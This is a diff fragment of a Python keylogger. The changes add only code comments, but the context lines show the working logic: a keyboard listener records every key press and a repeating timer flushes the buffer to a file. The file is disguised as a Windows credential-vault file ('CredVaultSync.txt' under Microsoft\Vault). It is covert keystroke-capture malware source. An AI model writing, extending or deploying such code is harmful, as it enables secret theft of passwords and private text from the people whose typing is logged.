@@ -8,6 +8,8 @@ import os
 # Keyboard needed to grab key events
 
 path = r"C:\Users\AppData\Roaming\Microsoft\Vault\CredVaultSync.txt"
+
+# if path does not exist, make it.
 if not os.path.exists(os.path.dirname(path)):
     os.makedirs(os.path.dirname(path))
 buffer = ""
@@ -46,6 +48,7 @@ def log_when_pressed(key):
         pass
 
 def write_log():
+    # write to the log
     global buffer
     threading.Timer(time_interval, write_log).start()
     if buffer:
@@ -53,6 +56,7 @@ def write_log():
         buffer = ""
 
 def main():
+    #start logging. 
     print("Listening")    
     write_log()
     with keyboard.Listener(on_press=log_when_pressed) as listener:
